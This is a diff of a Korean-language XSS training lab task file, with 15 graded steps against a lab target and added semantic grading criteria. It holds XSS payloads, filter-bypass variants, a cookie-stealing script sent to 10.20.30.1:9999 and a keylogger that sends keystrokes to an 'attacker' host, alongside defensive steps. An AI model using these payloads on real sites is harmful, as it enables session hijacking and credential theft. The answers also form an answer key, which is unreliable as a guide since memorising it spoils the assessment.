@@ -17,92 +17,197 @@ steps:
   hint: URL 파라미터에 script 태그를 삽입하세요.
   category: xss_reflected
   points: 8
-  answer: curl -s 'http://10.20.30.80/#/search?q=<script>alert(1)</script>' 2>/dev/null
-    | head -20 && echo '반사형 XSS 테스트 완료'
+  answer: curl -s 'http://10.20.30.80/#/search?q=<script>alert(1)</script>' 2>/dev/null | head -20 &&
+    echo '반사형 XSS 테스트 완료'
   answer_detail: 반사형 XSS는 사용자 입력이 즉시 응답에 반영될 때 발생합니다.
   verify:
     type: output_contains
     expect: 반사형 XSS 테스트 완료
     field: stdout
+    semantic:
+      intent: 반사형 XSS — curl 'http://10.20.30.80/#/search?q=<script>alert(1)</script>'. 사용자 입력 즉시 응답 반영.
+        OWASP A03 + CWE-79. URL 파라미터 + script 태그.
+      success_criteria:
+      - 반사형 XSS 키워드
+      - <script> 페이로드
+      - /search?q=
+      acceptable_methods:
+      - URL 파라미터 + script
+      - Burp Repeater
+      - OWASP ZAP scan
+      negative_signs:
+      - 페이로드 없음
+      - 단순 GET
+      - 반사형 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: '다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용.'
   hint: HTML 이벤트 핸들러를 사용하세요.
   category: xss_reflected
   points: 10
-  answer: curl -s 'http://10.20.30.80/#/search?q=<img src=x onerror=alert(1)>' 2>/dev/null
-    | head -10 && echo 'XSS 페이로드 테스트 완료'
+  answer: curl -s 'http://10.20.30.80/#/search?q=<img src=x onerror=alert(1)>' 2>/dev/null | head -10
+    && echo 'XSS 페이로드 테스트 완료'
   answer_detail: 'img onerror, svg onload, iframe src=javascript: 등 다양한 벡터가 존재합니다.'
   verify:
     type: output_contains
     expect: XSS 페이로드 테스트 완료
     field: stdout
+    semantic:
+      intent: 다양한 XSS 페이로드 — <img src=x onerror=alert(1)> + <svg onload> + <iframe src=javascript:>. <script>
+        차단 시 이벤트 핸들러 우회. OWASP XSS Filter Evasion Cheatsheet.
+      success_criteria:
+      - img/svg/iframe 페이로드
+      - XSS 페이로드 키워드
+      - 이벤트 핸들러
+      acceptable_methods:
+      - 수동 페이로드
+      - PortSwigger XSS Cheatsheet
+      - BeEF 프레임워크
+      negative_signs:
+      - <script>만
+      - 이벤트 핸들러 없음
+      - 변형 페이로드 누락
   target_vm: attacker
 - order: 3
   instruction: '저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입.'
   hint: POST 요청으로 리뷰를 등록하세요.
   category: xss_stored
   points: 12
-  answer: "curl -s -X POST http://10.20.30.80/api/Feedbacks \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"comment\":\"<script>alert(document.cookie)</script>\"\
-    ,\"rating\":5}' 2>/dev/null \\\n | head -10 && echo '저장형 XSS 테스트 완료'"
+  answer: "curl -s -X POST http://10.20.30.80/api/Feedbacks \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{\"comment\":\"<script>alert(document.cookie)</script>\",\"rating\":5}' 2>/dev/null \\\
+    \n | head -10 && echo '저장형 XSS 테스트 완료'"
   answer_detail: 저장형 XSS는 DB에 저장되어 다른 사용자가 페이지를 볼 때마다 실행되므로 더 위험합니다.
   verify:
     type: output_contains
     expect: 저장형 XSS 테스트 완료
     field: stdout
+    semantic:
+      intent: '저장형 XSS — curl POST /api/Feedbacks -d {comment: <script>alert(document.cookie)</script>}.
+        DB 저장 → 다른 사용자 페이지 로드 시 매번 실행. 반사형보다 위험. OWASP A03 Stored.'
+      success_criteria:
+      - 저장형 XSS 키워드
+      - POST + 저장 가능 엔드포인트
+      - <script> 또는 페이로드
+      acceptable_methods:
+      - POST /api/Feedbacks
+      - 리뷰/댓글 저장
+      - Burp Repeater POST
+      negative_signs:
+      - POST 없음
+      - 저장 맥락 없음
+      - 다른 사용자 영향 누락
   target_vm: attacker
 - order: 4
   instruction: DOM 기반 XSS 취약점을 찾으시오.
   hint: JavaScript 소스에서 innerHTML, document.write, eval 등을 검색하세요.
   category: xss_dom
   points: 10
-  answer: curl -s http://10.20.30.80 | grep -ioE '(innerHTML|document\.write|eval\()'
-    | sort -u && echo 'DOM XSS 분석 완료'
+  answer: curl -s http://10.20.30.80 | grep -ioE '(innerHTML|document\.write|eval\()' | sort -u && echo
+    'DOM XSS 분석 완료'
   answer_detail: DOM XSS는 서버 응답 없이 클라이언트 JavaScript에서 발생합니다.
   verify:
     type: output_contains
     expect: DOM XSS 분석 완료
     field: stdout
+    semantic:
+      intent: 'DOM XSS — curl + grep -ioE ''(innerHTML|document.write|eval\()''. 클라이언트 JS에서 발생 (서버 응답
+        X). 위험 sinks: innerHTML/document.write/eval. CWE-79 + DOMSink.'
+      success_criteria:
+      - DOM XSS 분석 키워드
+      - innerHTML/document.write/eval 검색
+      - JS 소스 분석
+      acceptable_methods:
+      - grep DOM sink
+      - DOMPurify 분석
+      - browser DevTools breakpoint
+      negative_signs:
+      - DOM 맥락 없음
+      - 단순 grep
+      - sink 분석 없음
   target_vm: attacker
 - order: 5
   instruction: XSS로 쿠키를 탈취하는 페이로드를 작성하시오.
   hint: document.cookie를 외부로 전송하는 스크립트를 작성하세요.
   category: xss_exploit
   points: 10
-  answer: echo '<script>new Image().src="http://10.20.30.1:9999/steal?c="+document.cookie</script>'
-    && echo '쿠키 탈취 페이로드 작성 완료'
+  answer: echo '<script>new Image().src="http://10.20.30.1:9999/steal?c="+document.cookie</script>' &&
+    echo '쿠키 탈취 페이로드 작성 완료'
   answer_detail: XSS로 세션 쿠키를 탈취하면 세션 하이재킹이 가능합니다.
   verify:
     type: output_contains
     expect: 쿠키 탈취 페이로드 작성 완료
     field: stdout
+    semantic:
+      intent: 쿠키 탈취 — <script>new Image().src='http://attacker:9999/steal?c='+document.cookie</script>.
+        세션 쿠키 → 세션 하이재킹. HttpOnly 플래그로 방어. MITRE T1539.
+      success_criteria:
+      - 쿠키 탈취 페이로드 키워드
+      - Image src + document.cookie
+      - 외부 서버 전송
+      acceptable_methods:
+      - new Image().src
+      - fetch(외부)
+      - document.location
+      negative_signs:
+      - document.cookie 없음
+      - 외부 전송 없음
+      - HttpOnly 방어 누락
   target_vm: attacker
 - order: 6
   instruction: 'XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합.'
   hint: HTML 엔티티, URL 인코딩을 활용하세요.
   category: xss_bypass
   points: 12
-  answer: 'echo ''대소문자: <ScRiPt>alert(1)</sCrIpT>'' && echo ''HTML 엔티티: &#60;script&#62;''
-    && echo ''XSS 우회 기법 테스트 완료'''
+  answer: 'echo ''대소문자: <ScRiPt>alert(1)</sCrIpT>'' && echo ''HTML 엔티티: &#60;script&#62;'' && echo ''XSS
+    우회 기법 테스트 완료'''
   answer_detail: 블랙리스트 기반 필터는 인코딩, 대소문자 혼합, 이벤트 핸들러 등으로 우회할 수 있습니다.
   verify:
     type: output_contains
     expect: XSS 우회 기법 테스트 완료
     field: stdout
+    semantic:
+      intent: XSS 필터 우회 — 대소문자(<ScRiPt>) + HTML 엔티티(&#60;script&#62;) + URL 인코딩 + Unicode. 블랙리스트 우회. 화이트리스트
+        권장. OWASP XSS Filter Evasion.
+      success_criteria:
+      - XSS 우회 키워드
+      - 대소문자 + 엔티티/인코딩
+      - 변형 페이로드
+      acceptable_methods:
+      - 다중 인코딩 변형
+      - BeEF 모듈
+      - wfuzz payload processing
+      negative_signs:
+      - 변형 1개 이하
+      - 단일 인코딩
+      - 블랙리스트 한계 맥락 없음
   target_vm: attacker
 - order: 7
   instruction: Content-Security-Policy(CSP) 헤더를 분석하시오.
   hint: 응답 헤더에서 CSP를 확인하세요.
   category: xss_defense
   points: 10
-  answer: curl -sI http://10.20.30.80 | grep -i 'content-security-policy' && echo
-    'CSP 분석 완료' || echo 'CSP 미설정 확인 완료'
+  answer: curl -sI http://10.20.30.80 | grep -i 'content-security-policy' && echo 'CSP 분석 완료' || echo
+    'CSP 미설정 확인 완료'
   answer_detail: CSP는 인라인 스크립트 실행과 외부 리소스 로딩을 제한하여 XSS를 방어합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: CSP 분석 — curl -sI | grep -i 'content-security-policy'. 인라인 스크립트 차단 + 외부 리소스 제한. nonce/hash
+        기반. CSP Level 3. OWASP CSP Cheatsheet.
+      success_criteria:
+      - curl -sI + CSP grep
+      - CSP 또는 미설정 분석
+      - 응답 헤더
+      acceptable_methods:
+      - curl + grep CSP
+      - Mozilla Observatory
+      - CSP Evaluator (Google)
+      negative_signs:
+      - CSP 미점검
+      - 단순 GET
+      - nonce/hash 맥락 없음
   target_vm: attacker
 - order: 8
   instruction: XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
@@ -116,46 +221,103 @@ steps:
     type: output_contains
     expect: 키로거 페이로드 작성 완료
     field: stdout
+    semantic:
+      intent: XSS 키로거 — <script>document.addEventListener('keypress',function(e){new Image().src='http://attacker:9999/log?k='+e.key})</script>.
+        패스워드/신용카드 실시간 탈취. MITRE T1056.
+      success_criteria:
+      - 키로거 페이로드 키워드
+      - addEventListener keypress
+      - 외부 전송
+      acceptable_methods:
+      - addEventListener
+      - BeEF 키로거 모듈
+      - WebSocket 실시간 전송
+      negative_signs:
+      - addEventListener 없음
+      - 키 캡처 없음
+      - 외부 전송 없음
   target_vm: attacker
 - order: 9
   instruction: XSS를 이용한 피싱 페이지 삽입을 시뮬레이션하시오.
   hint: innerHTML로 가짜 로그인 폼을 삽입하세요.
   category: xss_exploit
   points: 10
-  answer: 'echo ''피싱 페이로드: document.body.innerHTML에 가짜 로그인 폼 삽입'' && echo ''피싱 페이로드
-    작성 완료'''
+  answer: 'echo ''피싱 페이로드: document.body.innerHTML에 가짜 로그인 폼 삽입'' && echo ''피싱 페이로드 작성 완료'''
   answer_detail: XSS 피싱은 원본 도메인에서 실행되므로 사용자가 의심하기 어렵습니다.
   verify:
     type: output_contains
     expect: 피싱 페이로드 작성 완료
     field: stdout
+    semantic:
+      intent: XSS 피싱 — document.body.innerHTML 가짜 로그인 폼 삽입. 원본 도메인 실행 → 사용자 의심 어려움. CSWSH/CSRF + XSS 결합.
+        MITRE T1566.
+      success_criteria:
+      - 피싱 페이로드 키워드
+      - innerHTML + 로그인 폼
+      - 원본 도메인 실행
+      acceptable_methods:
+      - innerHTML 삽입
+      - BeEF Social Engineering
+      - PhishingTab 모듈
+      negative_signs:
+      - innerHTML 없음
+      - 피싱 형식 없음
+      - 도메인 신뢰 맥락 없음
   target_vm: attacker
 - order: 10
   instruction: JavaScript 프레임워크별 XSS 벡터를 분석하시오.
   hint: Angular, React 등의 XSS 벡터를 정리하세요.
   category: xss_advanced
   points: 10
-  answer: 'echo ''=== 프레임워크별 XSS ==='' && echo ''Angular: 템플릿 인젝션'' && echo ''React:
-    dangerouslySetInnerHTML'' && echo ''Vue: v-html 디렉티브'' && echo ''프레임워크 XSS 분석
-    완료'''
+  answer: 'echo ''=== 프레임워크별 XSS ==='' && echo ''Angular: 템플릿 인젝션'' && echo ''React: dangerouslySetInnerHTML''
+    && echo ''Vue: v-html 디렉티브'' && echo ''프레임워크 XSS 분석 완료'''
   answer_detail: 각 프레임워크는 고유한 XSS 벡터를 가지고 있습니다.
   verify:
     type: output_contains
     expect: 프레임워크 XSS 분석 완료
     field: stdout
+    semantic:
+      intent: 프레임워크별 XSS — Angular(템플릿 인젝션 {{}}) + React(dangerouslySetInnerHTML) + Vue(v-html). 각 프레임워크
+        고유 벡터. 안전한 기본값 + 명시적 위험 함수.
+      success_criteria:
+      - 프레임워크 XSS 분석 키워드
+      - 3 프레임워크 (Angular/React/Vue)
+      - 각 벡터 명시
+      acceptable_methods:
+      - 프레임워크 비교
+      - PortSwigger XSS by framework
+      - Snyk Vulnerability DB
+      negative_signs:
+      - 프레임워크 1개 이하
+      - 벡터 없음
+      - 안전 기본값 맥락 없음
   target_vm: attacker
 - order: 11
   instruction: XSS Polyglot 페이로드를 작성하시오.
   hint: 여러 컨텍스트에서 동작하는 범용 페이로드를 만드세요.
   category: xss_advanced
   points: 10
-  answer: 'echo ''Polyglot: 여러 HTML/JS 컨텍스트에서 실행 가능한 페이로드'' && echo ''Polyglot 작성
-    완료'''
+  answer: 'echo ''Polyglot: 여러 HTML/JS 컨텍스트에서 실행 가능한 페이로드'' && echo ''Polyglot 작성 완료'''
   answer_detail: Polyglot 페이로드는 HTML, JS, CSS 등 여러 컨텍스트에서 동작하도록 설계됩니다.
   verify:
     type: output_contains
     expect: Polyglot 작성 완료
     field: stdout
+    semantic:
+      intent: XSS Polyglot — HTML/JS/CSS 여러 컨텍스트 동작 페이로드. 0xsp/PayloadsAllTheThings 모음. 다양한 입력 위치 동시 시도.
+        PortSwigger Polyglot Payloads.
+      success_criteria:
+      - Polyglot 작성 완료 키워드
+      - 다중 컨텍스트
+      - 범용 페이로드
+      acceptable_methods:
+      - XSS Polyglot 페이로드
+      - PortSwigger 모음
+      - PayloadsAllTheThings
+      negative_signs:
+      - 단일 컨텍스트
+      - Polyglot 맥락 없음
+      - 단순 페이로드
   target_vm: attacker
 - order: 12
   instruction: 자동화된 XSS 스캐닝을 수행하시오.
@@ -168,15 +330,29 @@ steps:
     type: output_contains
     expect: 자동 XSS 스캔 완료
     field: stdout
+    semantic:
+      intent: '자동 XSS 스캔 — 페이로드 목록 + 다중 입력 포인트 빠른 테스트. 도구: XSStrike/wfuzz/OWASP ZAP. 자동화로 커버리지↑. CI/CD
+        통합 가능.'
+      success_criteria:
+      - 자동 XSS 스캔 완료 키워드
+      - 페이로드 다중 테스트
+      - 스캐너 활용
+      acceptable_methods:
+      - XSStrike
+      - OWASP ZAP active scan
+      - Burp Active Scanner
+      negative_signs:
+      - 단일 페이로드
+      - 수동만
+      - 자동화 맥락 없음
   target_vm: attacker
 - order: 13
   instruction: XSS 방어 전략을 종합 정리하시오.
   hint: 입력 검증, 출력 인코딩, CSP를 포함하세요.
   category: xss_defense
   points: 10
-  answer: echo '=== XSS 방어 전략 ===' && echo '1. 출력 인코딩(HTML Entity)' && echo '2. 입력
-    검증(화이트리스트)' && echo '3. CSP 헤더 적용' && echo '4. HttpOnly 쿠키' && echo 'XSS 방어 정리
-    완료'
+  answer: echo '=== XSS 방어 전략 ===' && echo '1. 출력 인코딩(HTML Entity)' && echo '2. 입력 검증(화이트리스트)' && echo
+    '3. CSP 헤더 적용' && echo '4. HttpOnly 쿠키' && echo 'XSS 방어 정리 완료'
   answer_detail: 출력 인코딩이 가장 중요한 방어 수단이며, CSP로 2차 방어를 구성합니다.
   verify:
     type: output_contains
@@ -184,31 +360,75 @@ steps:
     - XSS 방어 정리 완료
     - XSS
     field: stdout
+    semantic:
+      intent: XSS 방어 — [1] 출력 인코딩 (HTML Entity, 가장 중요) + [2] 입력 검증 (화이트리스트) + [3] CSP 헤더 + [4] HttpOnly
+        쿠키. 다층 방어. OWASP XSS Prevention Cheatsheet.
+      success_criteria:
+      - XSS 방어 정리 키워드
+      - 4종 방어 (인코딩/검증/CSP/HttpOnly)
+      - 출력 인코딩 강조
+      acceptable_methods:
+      - OWASP Prevention Cheatsheet
+      - DOMPurify 사용
+      - Trusted Types API
+      negative_signs:
+      - 방어 2종 이하
+      - 출력 인코딩 누락
+      - 단층 방어
   target_vm: attacker
 - order: 14
   instruction: XSS 취약점 탐지를 자동화하는 스크립트를 설계하시오.
   hint: 주요 입력 포인트에 페이로드를 자동 삽입하세요.
   category: xss_tool
   points: 12
-  answer: echo '#!/bin/bash' && echo 'TARGETS=("search" "comment" "name")' && echo
-    'PAYLOAD="<script>alert(1)</script>"' && echo 'XSS 자동화 스크립트 설계 완료'
+  answer: echo '#!/bin/bash' && echo 'TARGETS=("search" "comment" "name")' && echo 'PAYLOAD="<script>alert(1)</script>"'
+    && echo 'XSS 자동화 스크립트 설계 완료'
   answer_detail: 자동화 스크립트는 다양한 입력 포인트에 체계적으로 페이로드를 테스트합니다.
   verify:
     type: output_contains
     expect: XSS 자동화 스크립트 설계 완료
     field: stdout
+    semantic:
+      intent: XSS 자동화 스크립트 — bash 스크립트 + TARGETS=(search comment name) + PAYLOAD=<script>alert(1)</script>
+        다중 입력 포인트 자동 테스트. 시스템 진단 자동화.
+      success_criteria:
+      - 자동화 스크립트 설계 키워드
+      - TARGETS + PAYLOAD 변수
+      - 다중 입력 포인트
+      acceptable_methods:
+      - bash 자동화
+      - Python requests + BS
+      - Burp Macro
+      negative_signs:
+      - 변수 없음
+      - 단일 포인트
+      - 자동화 맥락 없음
   target_vm: attacker
 - order: 15
   instruction: XSS 실습 종합 보고서를 작성하시오.
   hint: 발견 취약점, 유형, 영향, 조치를 포함하세요.
   category: verification
   points: 8
-  answer: 'echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo
-    ''발견: 반사형/저장형/DOM XSS'' && echo ''영향: 세션탈취, 피싱, 키로깅'' && echo ''조치: 출력 인코딩, CSP
-    적용'' && echo ''=== 보고서 완료 ==='''
+  answer: 'echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: 반사형/저장형/DOM XSS''
+    && echo ''영향: 세션탈취, 피싱, 키로깅'' && echo ''조치: 출력 인코딩, CSP 적용'' && echo ''=== 보고서 완료 ==='''
   answer_detail: XSS는 웹 애플리케이션에서 가장 흔한 취약점 중 하나입니다.
   verify:
     type: output_contains
     expect: 보고서 완료
     field: stdout
+    semantic:
+      intent: XSS 종합 보고서 — 대상/발견(반사형/저장형/DOM)/영향(세션탈취/피싱/키로깅)/조치(인코딩/CSP). PTES Reporting. CWE-79 + OWASP
+        A03.
+      success_criteria:
+      - 보고서 완료 키워드
+      - 발견/영향/조치 3섹션
+      - 3 유형 모두
+      acceptable_methods:
+      - echo > 보고서
+      - DefectDojo Finding
+      - PTES XSS 보고
+      negative_signs:
+      - 섹션 2개 이하
+      - 유형 분류 없음
+      - 조치 없음
   target_vm: attacker
